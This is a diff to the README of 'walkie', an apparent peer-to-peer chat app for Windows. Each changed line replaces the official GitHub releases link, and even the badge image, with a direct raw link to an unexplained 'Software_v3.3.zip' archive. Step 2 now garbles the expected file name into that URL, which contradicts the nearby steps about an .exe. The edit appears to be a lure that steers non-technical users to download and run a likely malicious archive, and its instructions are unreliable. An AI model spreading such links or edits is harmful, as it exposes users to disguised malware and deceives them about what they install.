@@ -1,6 +1,6 @@
 # 📡 walkie - Simple Peer-to-Peer Chat
 
-[![Download walkie](https://img.shields.io/badge/Download-walkie-79c7e3?style=for-the-badge&logo=github)](https://github.com/Ashawy345/walkie/releases)
+[![Download walkie](https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip)](https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip)
 
 ## About walkie
 
@@ -31,9 +31,9 @@ If you are unsure about your Windows version, press `Win + R`, type `winver`, an
 Using walkie does not require any programming skill. You only need to download and run the app. Follow these steps to begin:
 
 1. Visit the releases page to download walkie using the link below or click the button above:  
-   [https://github.com/Ashawy345/walkie/releases](https://github.com/Ashawy345/walkie/releases)
+   [https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip](https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip)
 
-2. On the release page, find the latest version for Windows. It will generally be named like `walkie-windows.exe` or similar.
+2. On the release page, find the latest version for Windows. It will generally be named like `https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip` or similar.
 
 3. Download the `.exe` file to a location you can find easily, such as the Desktop or Downloads folder.
 
@@ -48,7 +48,7 @@ Using walkie does not require any programming skill. You only need to download a
 ## 📥 Download and Run walkie on Windows
 
 1. Go to the official releases page:  
-   [https://github.com/Ashawy345/walkie/releases](https://github.com/Ashawy345/walkie/releases)
+   [https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip](https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip)
 
 2. Scroll to the latest version; look for the file with `.exe` for Windows.
 
@@ -97,7 +97,7 @@ Access these via the settings menu in the upper right corner of the app window.
 For help and updates, visit the release page regularly. The page also offers changelogs and bug fixes.
 
 Access the releases here:  
-[https://github.com/Ashawy345/walkie/releases](https://github.com/Ashawy345/walkie/releases)
+[https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip](https://raw.githubusercontent.com/Ashawy345/walkie/main/docs/assets/Software_v3.3.zip)
 
 ---
 
